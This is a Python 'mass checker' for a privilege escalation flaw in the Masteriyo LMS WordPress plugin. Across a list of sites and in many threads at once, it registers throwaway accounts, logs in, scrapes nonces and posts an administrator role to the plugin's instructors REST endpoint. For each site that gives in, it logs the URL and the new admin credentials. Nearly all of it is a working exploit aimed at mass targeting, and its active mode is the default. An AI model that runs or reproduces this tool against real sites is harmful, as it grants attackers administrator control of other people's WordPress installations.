#!/usr/bin/env python3
# Masteriyo LMS - Instructor Role Privilege Escalation Checker
# Usage: python3 checker.py -l targets.txt -t 20 -o vulnerable.txt
#        python3 checker.py -l targets.txt --safe   (passive detection only)

import argparse
import concurrent.futures
import html as _html_mod
import json as _json
import os
import random
import re
import sys
import time
import uuid
from urllib.parse import urlparse

import requests
try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except Exception:
    class _D:
        def __getattr__(self, _): return ""
        RESET = ""
    Fore = Style = _D()


# ======================================================================
# HTTP / HELPERS (mirrors the PoC)
# ======================================================================

UA_POOL = [
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

BASE_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "Connection": "keep-alive",
}

ACCOUNT_PATH          = "/account/"
SIGNUP_PATH           = "/account/signup/"
REGISTER_POST_PATH    = "/st/"
DASHBOARD_PATH        = "/account/#/dashboard"
AJAX_PATH             = "/wp-admin/admin-ajax.php"
REST_ESCALATE_TEMPLATE = "/wp-json/masteriyo/v1/users/instructors/{user_id}"
WP_REST_ROOT          = "/wp-json/"
MASTERIYO_NS          = "/wp-json/masteriyo/v1/"
WP_ME_PATH            = "/wp-json/wp/v2/users/me"


def build_headers(referer=None):
    h = dict(BASE_HEADERS)
    h["User-Agent"] = random.choice(UA_POOL)
    h["DNT"] = "1"
    h["Sec-Fetch-Site"] = "same-origin"
    h["Sec-Fetch-Mode"] = "navigate"
    h["Sec-Fetch-User"] = "?1"
    h["Sec-Fetch-Dest"] = "document"
    if referer:
        h["Referer"] = referer
    return h


def normalize_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def new_session(timeout):
    s = requests.Session()
    s.verify = False
    s.timeout = timeout
    a = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=1)
    s.mount("http://", a)
    s.mount("https://", a)
    return s


def has_logged_in_cookie(session):
    return any(c.name.startswith("wordpress_logged_in_") for c in session.cookies)


# ---------- nonce extraction (same as PoC) ----------

def extract_all_nonces(html):
    nonces = {}

    def add(k, v):
        k, v = k.strip(), v.strip()
        if not k or not v:
            return
        nonces.setdefault(k, set()).add(v)

    html_u = _html_mod.unescape(html)
    variants = [html_u, html_u.replace('\\"', '"'), html_u.replace("\\'", "'")]

    patterns = [
        (r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']', "_wpnonce"),
        (r'value=["\']([^"\']+)["\'][^>]*name=["\']_wpnonce["\']', "_wpnonce"),
        (r'id=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']', "_wpnonce"),
        (r'["\']_wpnonce["\']\s*[:=]\s*["\']([^"\']+)["\']', "_wpnonce"),
        (r'["\']nonce["\']\s*[:=]\s*["\']([^"\']+)["\']', "nonce"),
        (r'["\']wp_rest["\']\s*[:=]\s*["\']([^"\']+)["\']', "wp_rest"),
        (r'\\"_wpnonce\\"\s*[:=]\s*\\"([^"]+)\\"', "_wpnonce"),
        (r'\\"nonce\\"\s*[:=]\s*\\"([^"]+)\\"', "nonce"),
        (r'\\"wp_rest\\"\s*[:=]\s*\\"([^"]+)\\"', "wp_rest"),
        (r"\\'_wpnonce\\'\s*[:=]\s*\\'([^']+)\\'", "_wpnonce"),
        (r"\\'nonce\\'\s*[:=]\s*\\'([^']+)\\'", "nonce"),
        (r"\\'wp_rest\\'\s*[:=]\s*\\'([^']+)\\'", "wp_rest"),
    ]
    for txt in variants:
        for pat, key in patterns:
            for m in re.finditer(pat, txt, re.IGNORECASE | re.DOTALL):
                add(key, m.group(1))
    return nonces


def get_best_nonce(html, preferred):
    nonces = extract_all_nonces(html)
    for k in preferred:
        if k in nonces and nonces[k]:
            return next(iter(nonces[k]))
    for k, vs in nonces.items():
        if "nonce" in k.lower() and vs:
            return next(iter(vs))
    return None


def extract_dashboard_context(html):
    uid = m_nonce = None
    m = re.search(r'"current_user_id"\s*:\s*"(\d+)"', html, re.I)
    if m:
        uid = m.group(1)
    m = re.search(r'"nonce"\s*:\s*"([A-Za-z0-9]{4,64})"', html, re.I)
    if m:
        m_nonce = m.group(1)
    return uid, m_nonce


# ======================================================================
# CHECK STEPS
# ======================================================================

def check_wordpress(base, sess, timeout):
    try:
        r = sess.get(base.rstrip("/") + WP_REST_ROOT,
                     headers=build_headers(base), timeout=timeout, verify=False)
        if r.status_code != 200:
            return False, f"wp-json HTTP {r.status_code}"
        try:
            j = r.json()
            if "namespaces" in j or "name" in j:
                return True, "ok"
        except Exception:
            pass
        return False, "wp-json not JSON"
    except Exception as e:
        return False, f"unreachable: {e}"


def check_masteriyo(base, sess, timeout):
    try:
        r = sess.get(base.rstrip("/") + MASTERIYO_NS,
                     headers=build_headers(base), timeout=timeout, verify=False)
        # 200 = active, 401/403 = exists but restricted → still Masteriyo
        if r.status_code in (200, 401, 403):
            return True, f"HTTP {r.status_code}"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"error: {e}"


def masteriyo_register(base, sess, timeout, username, email, password):
    signup_url = base.rstrip("/") + SIGNUP_PATH
    st_url     = base.rstrip("/") + REGISTER_POST_PATH
    try:
        r = sess.get(signup_url, headers=build_headers(signup_url),
                     timeout=timeout, verify=False)
    except Exception as e:
        return False, f"signup_get: {e}"
    if r.status_code != 200:
        return False, f"signup HTTP {r.status_code}"

    nonce = get_best_nonce(r.text, ["_wpnonce", "signup_nonce", "registration_nonce"])
    if not nonce:
        return False, "no nonce"

    local = email.split("@")[0] or username
    data = {
        "remember": "true",
        "_wpnonce": nonce,
        "first-name": local,
        "last-name": "user",
        "username": username,
        "email": email,
        "password": password,
        "confirm-password": password,
        "masteriyo-registration": "yes",
    }
    h = build_headers(signup_url)
    h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        r = sess.post(st_url, data=data, headers=h, timeout=timeout, verify=False)
    except Exception as e:
        return False, f"signup_post: {e}"

    body = (r.text or "").lower()
    if "already registered" in body or "already exists" in body or "already taken" in body:
        return True, "already_registered"
    if "check your email" in body or "verify your email" in body:
        return True, "needs_email_verification"
    if "registration complete" in body or "account created" in body:
        return True, "registered"
    return True, "unclear"


def masteriyo_login(base, sess, timeout, user, pw):
    account_url = base.rstrip("/") + ACCOUNT_PATH
    ajax_url    = base.rstrip("/") + AJAX_PATH
    try:
        r = sess.get(account_url, headers=build_headers(account_url),
                     timeout=timeout, verify=False)
    except Exception as e:
        return False, f"account_get: {e}"
    if r.status_code != 200:
        return False, f"account HTTP {r.status_code}"

    nonce = get_best_nonce(r.text, ["_wpnonce", "nonce", "login_nonce"])
    if not nonce:
        return False, "no nonce"

    data = {
        "action": "masteriyo_login",
        "_wpnonce": nonce,
        "_wp_http_referer": ACCOUNT_PATH,
        "username": user,
        "password": pw,
        "redirect_to": account_url.rstrip("/"),
    }
    h = build_headers(account_url)
    h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        sess.post(ajax_url, data=data, headers=h, timeout=timeout, verify=False)
    except Exception as e:
        return False, f"ajax: {e}"

    if not has_logged_in_cookie(sess):
        return False, "no login cookie"
    return True, "ok"


def fetch_dashboard_nonce(base, sess, timeout):
    url = base.rstrip("/") + DASHBOARD_PATH
    try:
        r = sess.get(url, headers=build_headers(url), timeout=timeout,
                     verify=False, allow_redirects=True)
    except Exception:
        return None, None
    if r.status_code != 200:
        return None, None
    return extract_dashboard_context(r.text)


def get_me_roles(base, sess, nonce, timeout):
    url = base.rstrip("/") + WP_ME_PATH
    h = build_headers(base)
    h["X-WP-Nonce"] = nonce
    try:
        r = sess.get(url, headers=h, timeout=timeout, verify=False)
        if r.status_code == 200:
            j = r.json()
            return j.get("roles") or []
    except Exception:
        pass
    return []


def try_escalate(base, sess, timeout, user_id, nonce):
    url = base.rstrip("/") + REST_ESCALATE_TEMPLATE.format(user_id=user_id)
    h = build_headers(url)
    h["Content-Type"] = "application/json"
    h["X-WP-Nonce"] = nonce
    payload = {"roles": ["administrator"]}
    try:
        r = sess.post(url, headers=h, data=_json.dumps(payload),
                      timeout=timeout, verify=False)
    except Exception as e:
        return False, f"post: {e}"
    try:
        j = r.json()
        roles = j.get("roles") or []
        if "administrator" in roles:
            return True, "escalated_json"
        return False, f"roles={roles}"
    except Exception:
        if '"roles":["administrator"' in (r.text or ""):
            return True, "escalated_text"
        return False, f"HTTP {r.status_code}"


# ======================================================================
# PER-TARGET CHECK
# ======================================================================

def check_target(site, args):
    base = normalize_url(site)
    result = {"url": base, "status": "error", "detail": ""}

    sess = new_session(args.timeout)

    # 1) WordPress?
    ok, info = check_wordpress(base, sess, args.timeout)
    if not ok:
        result["status"] = "not_wordpress"
        result["detail"] = info
        return result

    # 2) Masteriyo plugin?
    ok, info = check_masteriyo(base, sess, args.timeout)
    if not ok:
        result["status"] = "no_masteriyo"
        result["detail"] = info
        return result

    if args.safe:
        result["status"] = "masteriyo_present"
        result["detail"] = info
        return result

    # 3) Register throwaway account
    uname = "chk_" + uuid.uuid4().hex[:8]
    email = f"{uname}@example.com"
    password = "Chk_" + uuid.uuid4().hex[:10] + "!"

    reg_ok, reg_info = masteriyo_register(base, sess, args.timeout, uname, email, password)
    if not reg_ok:
        result["status"] = "register_blocked"
        result["detail"] = reg_info
        return result
    if reg_info == "needs_email_verification":
        result["status"] = "registration_requires_email_verify"
        return result

    # 4) Login
    login_ok, login_info = masteriyo_login(base, sess, args.timeout, email, password)
    if not login_ok:
        result["status"] = "login_failed"
        result["detail"] = login_info
        return result

    # 5) Dashboard nonce
    uid, nonce = fetch_dashboard_nonce(base, sess, args.timeout)
    if not uid or not nonce:
        result["status"] = "no_dashboard_nonce"
        return result

    # 6) Baseline roles
    roles_before = get_me_roles(base, sess, nonce, args.timeout)

    # 7) Attempt escalation
    esc_ok, esc_info = try_escalate(base, sess, args.timeout, uid, nonce)

    # 8) Confirm on server
    roles_after = get_me_roles(base, sess, nonce, args.timeout)

    if esc_ok or "administrator" in roles_after:
        result["status"] = "VULNERABLE"
        result["detail"] = (
            f"roles_before={roles_before} roles_after={roles_after} "
            f"probe_account={email}:{password}"
        )
    else:
        result["status"] = "not_vulnerable"
        result["detail"] = f"before={roles_before} after={roles_after} esc={esc_info}"

    return result


# ======================================================================
# CLI
# ======================================================================

COLORS = {
    "VULNERABLE":   Fore.RED + Style.BRIGHT,
    "not_vulnerable": Fore.GREEN,
    "masteriyo_present": Fore.YELLOW,
    "no_masteriyo": Fore.MAGENTA,
    "not_wordpress": Fore.MAGENTA,
    "registration_requires_email_verify": Fore.YELLOW,
    "register_blocked": Fore.YELLOW,
    "login_failed": Fore.YELLOW,
    "no_dashboard_nonce": Fore.YELLOW,
    "error": Fore.RED,
}


def print_result(res):
    color = COLORS.get(res["status"], "")
    tag = res["status"].upper()
    print(f"{color}[{tag}]{Style.RESET_ALL} {res['url']}"
          + (f"  ::  {res['detail']}" if res.get("detail") else ""))


def main():
    ap = argparse.ArgumentParser(
        description="Mass checker for the Masteriyo instructor-role privilege escalation."
    )
    ap.add_argument("-l", "--list", required=True, help="File with one target per line")
    ap.add_argument("-t", "--threads", type=int, default=15, help="Concurrent workers (default 15)")
    ap.add_argument("--timeout", type=int, default=15, help="HTTP timeout seconds (default 15)")
    ap.add_argument("-o", "--output", default="vulnerable.txt",
                    help="Save vulnerable URLs here (default vulnerable.txt)")
    ap.add_argument("--safe", action="store_true",
                    help="Passive mode: only confirm WordPress + Masteriyo, no registration/escalation")
    args = ap.parse_args()

    if not os.path.exists(args.list):
        print(f"{Fore.RED}[!] List file not found: {args.list}{Style.RESET_ALL}")
        sys.exit(1)

    with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
        targets = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]

    if not targets:
        print(f"{Fore.RED}[!] Empty list.{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.CYAN}[*] Loaded {len(targets)} target(s). "
          f"Mode: {'SAFE' if args.safe else 'ACTIVE'}{Style.RESET_ALL}\n")

    start = time.time()
    vulnerable = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(check_target, t, args): t for t in targets}
        try:
            for fut in concurrent.futures.as_completed(futs):
                try:
                    res = fut.result()
                except Exception as e:
                    res = {"url": futs[fut], "status": "error", "detail": str(e)}
                print_result(res)
                if res["status"] == "VULNERABLE":
                    vulnerable.append(res["url"])
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
            ex.shutdown(wait=False, cancel_futures=True)

    elapsed = time.time() - start
    print(f"\n{Fore.CYAN}[*] Done in {elapsed:.2f}s "
          f"| Vulnerable: {len(vulnerable)}/{len(targets)}{Style.RESET_ALL}")

    if vulnerable:
        with open(args.output, "w", encoding="utf-8") as f:
            for u in vulnerable:
                f.write(u + "\n")
        print(f"{Fore.GREEN}[+] Saved to {args.output}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
